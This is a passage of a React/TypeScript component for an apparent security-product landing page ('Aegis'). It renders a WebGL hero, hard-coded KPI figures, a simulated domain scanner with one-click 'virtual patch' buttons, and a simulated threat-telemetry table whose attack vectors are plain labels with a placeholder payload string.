        effectiveStatus: isPatched ? ("pass" as const) : c.status,
        isPatched
      };
    });
  }, [currentScanData, scanDomain, patchedIds]);

  const effectiveScore = useMemo(() => {
    const bonus = effectiveChecks.reduce((acc, c) => {
      if (c.status !== "pass" && c.isPatched) return acc + c.scoreImpact;
      return acc;
    }, 0);
    return Math.min(100, currentScanData.score + bonus);
  }, [currentScanData, effectiveChecks]);

  const handlePatchCheck = (checkId: string, name: string) => {
    const key = `${scanDomain}-${checkId}`;
    setPatchedIds((prev) => ({ ...prev, [key]: true }));
    triggerToast(`Virtual WAF patch deployed: ${name}`);
  };

  const handlePatchAll = () => {
    const next: Record<string, boolean> = { ...patchedIds };
    currentScanData.checks.forEach((c) => {
      next[`${scanDomain}-${c.id}`] = true;
    });
    setPatchedIds(next);
    triggerToast(`All vulnerabilities on ${customDomainInput} mitigated via Aegis Edge`);
  };

  const handleQuarantineThreat = (id: string, ip: string) => {
    setThreats((prev) =>
      prev.map((t) => (t.id === id ? { ...t, status: "Quarantined" } : t))
    );
    triggerToast(`Autonomous BGP/XDP Quarantine applied to ${ip}`);
  };

  const handleSimulateAttackWave = () => {
    const vectors: ThreatEvent["vector"][] = [
      "SQLi / XSS",
      "API Credential Stuffing",
      "DDoS Botnet",
      "Supply Chain SSRF"
    ];
    const picked = vectors[Math.floor(Math.random() * vectors.length)];
    const idNum = 9942 + threats.length;
    const newEvent: ThreatEvent = {
      id: `THR-${idNum}`,
      timestamp: "Just now",
      vector: picked,
      severity: "Critical",
      sourceIp: `${104 + (idNum % 90)}.${28 + (idNum % 120)}.19.${idNum % 250}`,
      asn: "AS13335 EdgeNet Probe",
      targetEndpoint: picked === "SQLi / XSS" ? "POST /api/v2/auth/login" : "POST /v2/graphql/transfer",
      latencyMs: +(0.24 + (idNum % 15) * 0.01).toFixed(2),
      status: "Mitigated",
      payloadSnippet: `SYNTHETIC_ZERO_DAY_VECTOR [${picked.toUpperCase()}] :: Blocked at eBPF XDP hook in 0.28ms`,
      ruleId: `AEGIS-AUTO-${idNum}`
    };
    setThreats((prev) => [newEvent, ...prev.slice(0, 7)]);
    triggerToast(`Neutralized simulated ${picked} wave (${newEvent.id})`);
  };

  const filteredThreats = useMemo(() => {
    if (vectorFilter === "All") return threats;
    return threats.filter((t) => t.vector === vectorFilter);
  }, [threats, vectorFilter]);

  const activeModule = useMemo(
    () => ARCHITECTURE_MODULES.find((m) => m.id === activeArchTab) || ARCHITECTURE_MODULES[0],
    [activeArchTab]
  );

  const isDark = theme === "dark";

  return (
    <div
      className={
        isDark
          ? "min-h-screen bg-[#04090F] text-slate-100 selection:bg-sky-500/30 selection:text-sky-200 font-sans"
          : "min-h-screen bg-[#E5E2DC] text-slate-900 selection:bg-sky-600/20 selection:text-sky-900 font-sans"
      }
    >
      {/* Floating Toast Notification */}
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50 flex items-center gap-3 px-4 py-3 rounded-xl bg-sky-500 text-slate-950 font-semibold text-sm shadow-2xl shadow-sky-500/30 border border-sky-300">
          <ShieldCheck className="w-4 h-4 shrink-0" />
          <span>{toastMessage}</span>
          <button
            type="button"
            onClick={() => setToastMessage(null)}
            className="ml-1 p-0.5 rounded hover:bg-sky-600/30"
            aria-label="Dismiss notification"
          >
            <X className="w-3.5 h-3.5" />
          </button>
        </div>
      )}

      {/* 1. LIQUID SCULPTURE HERO (WebGL2 GPGPU Particle Engine) */}
      <div className="relative">
        <SculptureHero
          theme={theme}
          onThemeChange={setTheme}
          restStyle={heroRestStyle}
          liquid={heroLiquid}
          turbulence={heroTurbulence}
          particleSpread={heroSpread}
          streaks={heroStreaks}
        />

        {/* Floating WebGL Particle Physics Customizer Pill */}
        <div className="absolute top-20 right-5 md:right-12 z-20">
          <button
            type="button"
            onClick={() => setShowHeroControls((v) => !v)}
            className={`inline-flex items-center gap-2 px-3.5 py-2 rounded-full text-xs font-medium backdrop-blur-md border transition ${
              isDark
                ? "bg-slate-900/80 border-slate-700/80 text-slate-200 hover:border-sky-400"
                : "bg-white/80 border-slate-300 text-slate-800 hover:border-sky-600"
            }`}
          >
            <Sliders className="w-3.5 h-3.5 text-sky-400" />
            <span>GPU Lattice Controls</span>
          </button>

          {showHeroControls && (
            <div
              className={`mt-2 w-72 p-4 rounded-2xl backdrop-blur-xl border shadow-2xl text-xs space-y-3.5 ${
                isDark
                  ? "bg-slate-950/90 border-slate-800 text-slate-200"
                  : "bg-white/95 border-slate-300 text-slate-800"
              }`}
            >
              <div className="flex items-center justify-between border-b border-slate-800/60 pb-2">
                <span className="font-semibold text-sky-400 flex items-center gap-1.5">
                  <Sparkles className="w-3.5 h-3.5" /> WebGL2 GPGPU Engine
                </span>
                <button
                  type="button"
                  onClick={() => setShowHeroControls(false)}
                  className="opacity-60 hover:opacity-100"
                  aria-label="Close GPU controls"
                >
                  <X className="w-3.5 h-3.5" />
                </button>
              </div>

              <div className="flex items-center justify-between">
                <span>Rest State Mode</span>
                <div className="inline-flex rounded-lg p-0.5 bg-slate-800/60">
                  <button
                    type="button"
                    onClick={() => setHeroRestStyle("image")}
                    className={`px-2.5 py-1 rounded-md transition ${
                      heroRestStyle === "image"
                        ? "bg-sky-500 text-slate-950 font-semibold"
                        : "text-slate-300"
                    }`}
                  >
                    Sculpture
                  </button>
                  <button
                    type="button"
                    onClick={() => setHeroRestStyle("particles")}
                    className={`px-2.5 py-1 rounded-md transition ${
                      heroRestStyle === "particles"
                        ? "bg-sky-500 text-slate-950 font-semibold"
                        : "text-slate-300"
                    }`}
                  >
                    100k Particles
                  </button>
                </div>
              </div>

              <div>
                <div className="flex justify-between mb-1">
                  <span>Liquid Flow Intensity</span>
                  <span className="font-mono text-sky-400">{heroLiquid.toFixed(2)}</span>
                </div>
                <input
                  type="range"
                  min="0.2"
                  max="2.0"
                  step="0.05"
                  value={heroLiquid}
                  onChange={(e) => setHeroLiquid(parseFloat(e.target.value))}
                  className="w-full accent-sky-400"
                />
              </div>

              <div>
                <div className="flex justify-between mb-1">
                  <span>Curl-Noise Turbulence</span>
                  <span className="font-mono text-sky-400">{heroTurbulence.toFixed(2)}</span>
                </div>
                <input
                  type="range"
                  min="0.2"
                  max="2.0"
                  step="0.05"
                  value={heroTurbulence}
                  onChange={(e) => setHeroTurbulence(parseFloat(e.target.value))}
                  className="w-full accent-sky-400"
                />
              </div>

              <div>
                <div className="flex justify-between mb-1">
                  <span>Particle Scatter Spread</span>
                  <span className="font-mono text-sky-400">{heroSpread.toFixed(2)}</span>
                </div>
                <input
                  type="range"
                  min="0.3"
                  max="2.0"
                  step="0.05"
                  value={heroSpread}
                  onChange={(e) => setHeroSpread(parseFloat(e.target.value))}
                  className="w-full accent-sky-400"
                />
              </div>

              <div className="flex items-center justify-between pt-1">
                <span>Velocity Comet Streaks</span>
                <button
                  type="button"
                  onClick={() => setHeroStreaks((s) => !s)}
                  className={`px-2.5 py-1 rounded-md font-medium ${
                    heroStreaks
                      ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
                      : "bg-slate-800 text-slate-400"
                  }`}
                >
                  {heroStreaks ? "Enabled" : "Disabled"}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* 2. REAL-TIME GLOBAL SOC KPI BAR */}
      <div
        className={`border-y ${
          isDark
            ? "bg-slate-950/90 border-slate-800/80"
            : "bg-stone-200/80 border-stone-300"
        }`}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 grid grid-cols-2 md:grid-cols-4 gap-6">
          <div className="flex items-start gap-3.5">
            <div className="p-2.5 rounded-xl bg-sky-500/10 border border-sky-500/20 text-sky-400">
              <Zap className="w-5 h-5" />
            </div>
            <div>
              <div className="text-2xl sm:text-3xl font-bold tracking-tight font-mono">0.35ms</div>
              <div className="text-xs opacity-70 mt-0.5">p99 Edge AST Inspection Latency</div>
            </div>
          </div>

          <div className="flex items-start gap-3.5">
            <div className="p-2.5 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div>
              <div className="text-2xl sm:text-3xl font-bold tracking-tight font-mono">248 Tbps</div>
              <div className="text-xs opacity-70 mt-0.5">Global Anycast DDoS Scrubbing</div>
            </div>
          </div>

          <div className="flex items-start gap-3.5">
            <div className="p-2.5 rounded-xl bg-indigo-500/10 border border-indigo-500/20 text-indigo-400">
              <Activity className="w-5 h-5" />
            </div>
            <div>
              <div className="text-2xl sm:text-3xl font-bold tracking-tight font-mono">4.8B+</div>
              <div className="text-xs opacity-70 mt-0.5">Zero-Day & API Exploits Blocked / Day</div>
            </div>
          </div>

          <div className="flex items-start gap-3.5">
            <div className="p-2.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400">
              <Lock className="w-5 h-5" />
            </div>
            <div>
              <div className="text-2xl sm:text-3xl font-bold tracking-tight font-mono">99.999%</div>
              <div className="text-xs opacity-70 mt-0.5">Zero-Trust Uptime SLA with Financial Backing</div>
            </div>
          </div>
        </div>
      </div>

      {/* 3. INTERACTIVE ATTACK SURFACE & PERIMETER SCANNER (#scanner) */}
      <section id="scanner" className="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 mb-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wider bg-sky-500/10 text-sky-400 border border-sky-500/20 mb-3">
              <Search className="w-3.5 h-3.5" /> Interactive Perimeter Audit
            </div>
            <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">
              Instant Web & API Attack Surface Scanner
            </h2>
            <p className="mt-2 text-sm sm:text-base opacity-75 max-w-2xl">
              Test any production domain or select a sample enterprise target below to inspect TLS 1.3 post-quantum readiness, GraphQL/REST schema exposure, and PCI-DSS 4.0 script integrity.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <span className="text-xs uppercase tracking-wider opacity-60 mr-1">Sample Targets:</span>
            {Object.keys(DOMAIN_PRESETS).map((preset) => (
              <button
                key={preset}
                type="button"
                onClick={() => handleRunScan(preset)}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono transition border ${
                  scanDomain === preset
                    ? "bg-sky-500/20 border-sky-400 text-sky-300 font-semibold"
                    : isDark
                    ? "bg-slate-900 border-slate-800 text-slate-400 hover:border-slate-700"
                    : "bg-white border-stone-300 text-slate-700 hover:border-stone-400"
                }`}
              >
                {preset}
              </button>
            ))}
          </div>
        </div>

        <div
          className={`rounded-3xl border p-6 sm:p-8 shadow-2xl ${
            isDark
              ? "bg-slate-900/60 border-slate-800/90"
              : "bg-white border-stone-300"
          }`}
        >
          <div className="flex flex-col md:flex-row gap-4 items-stretch md:items-center justify-between pb-6 border-b border-slate-800/60">
            <div className="flex-1 flex items-center gap-3 px-4 py-3 rounded-2xl border bg-slate-950/70 border-slate-800 text-slate-100">
              <Globe className="w-5 h-5 text-sky-400 shrink-0" />
              <input
                type="text"
                value={customDomainInput}
                onChange={(e) => setCustomDomainInput(e.target.value)}
                placeholder="Enter domain or API hostname (e.g. api.fintech-core.io)"
                aria-label="Target domain to scan"
                className="w-full bg-transparent text-sm sm:text-base font-mono focus:outline-none"
              />
            </div>

            <div className="flex flex-wrap items-center gap-3">
              <button
                type="button"
                onClick={() => handleRunScan()}
                disabled={isScanning}
                className="inline-flex items-center justify-center gap-2 px-6 py-3.5 rounded-2xl bg-sky-400 hover:bg-sky-300 text-slate-950 font-semibold text-sm transition disabled:opacity-50"
              >
                <RefreshCw className={`w-4 h-4 ${isScanning ? "animate-spin" : ""}`} />
                <span>{isScanning ? `Scanning (${scanProgress}%)` : "Run Deep Perimeter Audit"}</span>
              </button>

              <button
                type="button"
                onClick={handlePatchAll}
                className="inline-flex items-center justify-center gap-2 px-5 py-3.5 rounded-2xl bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 font-semibold text-sm transition"
              >
                <ShieldCheck className="w-4 h-4" />
                <span>Auto-Synthesize All WAF Patches</span>
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 pt-6 items-start">
            <div
              className={`lg:col-span-4 rounded-2xl p-6 border ${
                isDark ? "bg-slate-950/80 border-slate-800" : "bg-stone-100 border-stone-300"
              }`}
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold uppercase tracking-wider opacity-70">
                  Security Posture Score
                </span>
                <span className="text-xs font-mono px-2.5 py-0.5 rounded-full bg-sky-500/10 text-sky-400 border border-sky-500/20">
                  TLS RTT: {currentScanData.latency}
                </span>
              </div>

              <div className="mt-5 flex items-baseline gap-3">
                <span
                  className={`text-6xl font-bold font-mono tracking-tight ${
                    effectiveScore >= 90
                      ? "text-emerald-400"
                      : effectiveScore >= 70
                      ? "text-amber-400"
                      : "text-rose-400"
                  }`}
                >
                  {effectiveScore}
                </span>
                <span className="text-lg opacity-60 font-mono">/ 100</span>
              </div>

              <div className="mt-3 w-full h-2.5 rounded-full bg-slate-800 overflow-hidden">
                <div
                  className={`h-full transition-all duration-500 ${
                    effectiveScore >= 90
                      ? "bg-emerald-400"
                      : effectiveScore >= 70
                      ? "bg-amber-400"
                      : "bg-rose-500"
                  }`}
                  style={{ width: `${effectiveScore}%` }}
                />
              </div>

              <p className="mt-4 text-xs leading-relaxed opacity-75">
                {effectiveScore === 100
                  ? "All detected perimeter vulnerabilities are actively mitigated by Aegis Autonomous Edge rules."
                  : "Vulnerabilities detected in unshielded origin routes. Deploy one-click virtual patches on the right to simulate Aegis edge protection."}
              </p>

              <div className="mt-6 pt-5 border-t border-slate-800/60 flex items-center justify-between text-xs">
                <span className="opacity-70">Export JSON Audit Report</span>
                <button
                  type="button"
                  onClick={() =>
                    copyTextSafe(
                      JSON.stringify(
                        {
                          target: customDomainInput,
                          postureScore: effectiveScore,
                          checks: effectiveChecks
                        },
                        null,
                        2
                      ),
                      "JSON Security Audit Report"
                    )
                  }
                  className="inline-flex items-center gap-1.5 text-sky-400 hover:underline font-medium"
                >
                  <Copy className="w-3.5 h-3.5" /> Copy JSON
                </button>
              </div>
            </div>

            <div className="lg:col-span-8 space-y-3.5">
              {effectiveChecks.map((chk) => (
                <div
                  key={chk.id}
                  className={`p-4 sm:p-5 rounded-2xl border transition ${
                    isDark
                      ? "bg-slate-950/60 border-slate-800/90 hover:border-slate-700"
                      : "bg-stone-50 border-stone-300"
                  }`}
                >
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="flex items-start gap-3">
                      {chk.effectiveStatus === "pass" ? (
                        <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                      ) : chk.effectiveStatus === "warn" ? (
                        <AlertTriangle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                      ) : (
                        <XCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
                      )}
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="font-semibold text-sm sm:text-base">{chk.name}</span>
                          <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300">
                            {chk.category}
                          </span>
                        </div>
                        <p className="text-xs sm:text-sm opacity-75 mt-1">{chk.finding}</p>
                        <p className="text-xs text-sky-400/90 mt-1.5 font-mono">
                          Remediation: {chk.remediation}
                        </p>
                      </div>
                    </div>

                    <div className="shrink-0 flex items-center gap-2 self-end sm:self-center">
                      {chk.isPatched ? (
                        <span className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">
                          <ShieldCheck className="w-3.5 h-3.5" /> Shielded at Edge
                        </span>
                      ) : (
                        <button
                          type="button"
                          onClick={() => handlePatchCheck(chk.id, chk.name)}
                          className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-semibold bg-sky-500/20 hover:bg-sky-500 text-sky-300 hover:text-slate-950 border border-sky-500/40 transition"
                        >
                          <Zap className="w-3.5 h-3.5" /> Deploy Virtual Patch (+{chk.scoreImpact} pts)
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* 4. REAL-TIME THREAT TELEMETRY & LIVE SOC STREAM (#threat-telemetry) */}
      <section
        id="threat-telemetry"
        className={`py-20 border-t ${
          isDark ? "border-slate-800/80 bg-slate-950/40" : "border-stone-300 bg-stone-200/40"
        }`}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 mb-10">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wider bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mb-3">
                <Radio className="w-3.5 h-3.5 animate-pulse" /> Global Edge Telemetry Stream
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">
                Real-Time Threat Intelligence & Mitigation Matrix
              </h2>
              <p className="mt-2 text-sm sm:text-base opacity-75 max-w-2xl">
                Observe live L7 attack vectors neutralized across 310 global Anycast locations. Inspect raw exploit payloads or quarantine hostile ASNs with zero origin latency.
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-3">
              <div className="inline-flex rounded-xl p-1 bg-slate-900 border border-slate-800">
                {(["1H", "24H", "7D"] as const).map((tw) => (
                  <button
                    key={tw}
                    type="button"
                    onClick={() => setTimeWindow(tw)}
                    className={`px-3.5 py-1.5 rounded-lg text-xs font-mono font-semibold transition ${
                      timeWindow === tw
                        ? "bg-sky-400 text-slate-950"
                        : "text-slate-400 hover:text-slate-200"
                    }`}
                  >
                    {tw}
                  </button>
                ))}
              </div>

              <button
                type="button"
                onClick={handleSimulateAttackWave}
                className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-semibold bg-rose-500/15 hover:bg-rose-500/25 text-rose-300 border border-rose-500/30 transition"
              >
                <ShieldAlert className="w-4 h-4" />
                <span>Simulate Zero-Day Attack Wave</span>
              </button>
            </div>
          </div>

          <div
            className={`rounded-3xl border p-6 mb-8 ${
              isDark ? "bg-slate-900/60 border-slate-800" : "bg-white border-stone-300"
            }`}
          >
            <div className="flex flex-wrap items-center justify-between gap-4 mb-4">
              <div>
                <h3 className="text-base font-semibold">
                  Clean Origin Traffic vs. Mitigated Edge Attacks ({timeWindow} Window)
                </h3>
                <p className="text-xs opacity-70">
                  Sub-millisecond eBPF + AST filtering ensures zero latency spikes during volumetric L7 floods
                </p>
              </div>
              <div className="flex items-center gap-5 text-xs">
                <span className="inline-flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-sky-400" /> Clean Verified Requests
                </span>
                <span className="inline-flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-400" /> Blocked Exploit Payloads
                </span>
              </div>
            </div>

            <div className="relative h-72 w-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={TELEMETRY_SERIES[timeWindow]}>
                  <defs>
                    <linearGradient id="cleanGrad" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#38BDF8" stopOpacity={0.35} />
                      <stop offset="95%" stopColor="#38BDF8" stopOpacity={0.0} />
                    </linearGradient>
                    <linearGradient id="blockGrad" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#FB7185" stopOpacity={0.45} />
                      <stop offset="95%" stopColor="#FB7185" stopOpacity={0.0} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#1E293B" />
                  <XAxis dataKey="time" stroke="#64748B" fontSize={12} />
                  <YAxis stroke="#64748B" fontSize={12} />
                  <Tooltip
                    contentStyle={{
                      backgroundColor: "#0F172A",
                      borderColor: "#1E293B",
                      borderRadius: "12px",
                      color: "#F8FAFC",
                      fontSize: "12px"
                    }}
                  />
                  <Area
                    type="monotone"
                    dataKey="clean"
                    name="Clean Requests"
                    stroke="#38BDF8"
                    strokeWidth={2}
                    fillOpacity={1}
                    fill="url(#cleanGrad)"
                  />
                  <Area
                    type="monotone"
                    dataKey="blocked"
                    name="Blocked Attacks"
                    stroke="#FB7185"
                    strokeWidth={2}
                    fillOpacity={1}
                    fill="url(#blockGrad)"
                  />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          <div
            className={`rounded-3xl border overflow-hidden ${
              isDark ? "bg-slate-900/60 border-slate-800" : "bg-white border-stone-300"
            }`}
          >
            <div className="p-5 border-b border-slate-800/70 flex flex-wrap items-center justify-between gap-4">
              <div className="flex items-center gap-2">
                <Filter className="w-4 h-4 text-sky-400" />
                <span className="text-sm font-semibold">Filter by Attack Vector:</span>
              </div>
              <div className="flex flex-wrap gap-2">
                {["All", "SQLi / XSS", "API Credential Stuffing", "DDoS Botnet", "Supply Chain SSRF"].map(
                  (vec) => (
                    <button
                      key={vec}
                      type="button"
                      onClick={() => setVectorFilter(vec)}
                      className={`px-3 py-1.5 rounded-xl text-xs font-medium transition ${
                        vectorFilter === vec
                          ? "bg-sky-400 text-slate-950 font-semibold"
                          : isDark
                          ? "bg-slate-950 text-slate-300 hover:bg-slate-800"
                          : "bg-stone-100 text-slate-700 hover:bg-stone-200"
                      }`}
                    >
                      {vec}
                    </button>
                  )
                )}
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse text-xs sm:text-sm">
                <thead>
                  <tr
                    className={`border-b text-[11px] uppercase tracking-wider font-mono ${
                      isDark ? "border-slate-800 bg-slate-950/60 text-slate-400" : "border-stone-200 bg-stone-100 text-slate-600"
                    }`}
                  >
                    <th className="py-3.5 px-4">Event ID</th>
                    <th className="py-3.5 px-4">Attack Vector</th>
                    <th className="py-3.5 px-4">Source IP / ASN</th>
                    <th className="py-3.5 px-4">Target Route</th>
                    <th className="py-3.5 px-4">Edge Latency</th>
                    <th className="py-3.5 px-4">Status</th>
                    <th className="py-3.5 px-4 text-right">SOC Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50">
                  {filteredThreats.map((item) => (
                    <tr key={item.id} className="hover:bg-sky-500/5 transition">
                      <td className="py-3.5 px-4 font-mono font-semibold text-sky-400">
                        {item.id}
                        <div className="text-[11px] font-normal opacity-60">{item.timestamp}</div>
                      </td>
                      <td className="py-3.5 px-4">
                        <span className="font-medium">{item.vector}</span>
                        <div className="mt-0.5">
                          <span
                            className={`inline-block text-[10px] font-mono px-2 py-0.5 rounded ${
                              item.severity === "Critical"
                                ? "bg-rose-500/20 text-rose-300 border border-rose-500/30"
                                : item.severity === "High"
                                ? "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                                : "bg-sky-500/20 text-sky-300"
                            }`}
                          >
                            {item.severity}
                          </span>
                        </div>
                      </td>
                      <td className="py-3.5 px-4 font-mono text-xs">
                        <div>{item.sourceIp}</div>
                        <div className="opacity-60">{item.asn}</div>
                      </td>
                      <td className="py-3.5 px-4 font-mono text-xs">{item.targetEndpoint}</td>
                      <td className="py-3.5 px-4 font-mono text-emerald-400">{item.latencyMs}ms</td>
                      <td className="py-3.5 px-4">
                        <span
                          className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${
                            item.status === "Quarantined"
                              ? "bg-purple-500/20 text-purple-300 border border-purple-500/30"
                              : item.status === "Mitigated"
                              ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                              : "bg-amber-500/20 text-amber-300"
                          }`}
                        >
                          <span className="w-1.5 h-1.5 rounded-full bg-current" />
                          {item.status}
                        </span>
                      </td>
                      <td className="py-3.5 px-4 text-right space-x-2 whitespace-nowrap">
                        <button
                          type="button"
                          onClick={() => setSelectedThreat(item)}
                          className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-200 transition"
                        >
                          <Eye className="w-3.5 h-3.5" /> Inspect
                        </button>
                        {item.status !== "Quarantined" && (
                          <button
                            type="button"
                            onClick={() => handleQuarantineThreat(item.id, item.sourceIp)}
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-medium bg-rose-500/20 hover:bg-rose-500 text-rose-300 hover:text-slate-950 transition"
                          >
                            <Lock className="w-3.5 h-3.5" /> Quarantine IP
                          </button>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {selectedThreat && (
              <div className="p-5 bg-slate-950 border-t border-slate-800 text-slate-200">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2 text-xs font-mono text-sky-400">
                    <Terminal className="w-4 h-4" />
                    <span>
                      Forensic Packet Inspection — {selectedThreat.id} ({selectedThreat.ruleId})
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => setSelectedThreat(null)}
                    className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                  >
                    <X className="w-3.5 h-3.5" /> Close Inspector
                  </button>
                </div>
                <pre className="p-3.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono text-rose-300 overflow-x-auto">
                  {selectedThreat.payloadSnippet}
                </pre>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* 5. CORE SECURITY ARCHITECTURE & CODE INTEGRATION (#architecture) */}
      <section id="architecture" className="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-10">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wider bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 mb-3">
            <Cpu className="w-3.5 h-3.5" /> Defense-in-Depth Stack
          </div>
          <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">
            Unified Web, API, and Kernel Security Architecture
          </h2>
          <p className="mt-2 text-sm sm:text-base opacity-75 max-w-2xl">
            Replace fragmented legacy WAF appliances, bot managers, and runtime agents with a single programmable security plane deployed via code.
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 mb-8">
          {ARCHITECTURE_MODULES.map((mod) => {
            const active = mod.id === activeArchTab;
            return (
              <button
                key={mod.id}
                type="button"
                onClick={() => setActiveArchTab(mod.id)}
                className={`text-left p-4 rounded-2xl border transition ${
                  active
                    ? "bg-sky-500/15 border-sky-400 shadow-lg shadow-sky-500/10"
                    : isDark
                    ? "bg-slate-900/60 border-slate-800 hover:border-slate-700"
                    : "bg-white border-stone-300 hover:border-stone-400"
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-sky-500/10 text-sky-400">
                    {mod.badge}
                  </span>
                  <ChevronRight className={`w-4 h-4 ${active ? "text-sky-400" : "opacity-40"}`} />
                </div>
                <div className="font-semibold text-sm">{mod.title}</div>
              </button>
            );
          })}
        </div>

        <div
          className={`rounded-3xl border p-6 sm:p-8 grid grid-cols-1 lg:grid-cols-12 gap-8 items-center ${
            isDark ? "bg-slate-900/60 border-slate-800" : "bg-white border-stone-300"
          }`}
        >
          <div className="lg:col-span-5 space-y-6">
            <div className="inline-flex items-center gap-2 text-xs font-mono text-sky-400">
              <Layers className="w-4 h-4" />
              <span>{activeModule.badge}</span>
            </div>
            <h3 className="text-2xl font-bold tracking-tight">{activeModule.title}</h3>
            <p className="text-sm leading-relaxed opacity-80">{activeModule.summary}</p>

            <div className="grid grid-cols-3 gap-3 pt-2">
              {activeModule.metrics.map((m, idx) => (
                <div
                  key={idx}
                  className={`p-3 rounded-xl border ${
                    isDark ? "bg-slate-950/70 border-slate-800" : "bg-stone-100 border-stone-300"
                  }`}
                >
                  <div className="text-sm sm:text-base font-bold font-mono text-sky-400">
                    {m.value}
                  </div>
                  <div className="text-[11px] opacity-70 mt-0.5">{m.label}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="lg:col-span-7">
            <div className="rounded-2xl overflow-hidden border border-slate-800 bg-slate-950 text-slate-100 shadow-xl">
              <div className="flex items-center justify-between px-4 py-3 border-b border-slate-800 bg-slate-900/80 text-xs font-mono">
                <span className="flex items-center gap-2 text-slate-300">
                  <FileCode className="w-4 h-4 text-sky-400" />
                  {activeModule.codeTitle}
                </span>
                <button
                  type="button"
                  onClick={() => {
                    copyTextSafe(activeModule.code, activeModule.codeTitle);
                    setCopiedCode(true);
                    window.setTimeout(() => setCopiedCode(false), 2000);
                  }}
                  className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 transition"
                >
                  {copiedCode ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" /> Copied
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" /> Copy Policy
                    </>
                  )}
                </button>
              </div>
              <pre className="p-5 text-xs sm:text-sm font-mono leading-relaxed overflow-x-auto text-sky-200">
                <code>{activeModule.code}</code>
              </pre>
            </div>
          </div>
        </div>
      </section>

      {/* 6. COMPLIANCE & CONTINUOUS ATTESTATION MATRIX (#compliance) */}
      <section
        id="compliance"
        className={`py-20 border-t ${
          isDark ? "border-slate-800/80 bg-slate-950/40" : "border-stone-300 bg-stone-200/40"
        }`}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-10">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wider bg-amber-500/10 text-amber-400 border border-amber-500/20 mb-3">
                <Key className="w-3.5 h-3.5" /> Zero-Effort Audit Evidence
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">
                Continuous Regulatory & Cryptographic Compliance
              </h2>
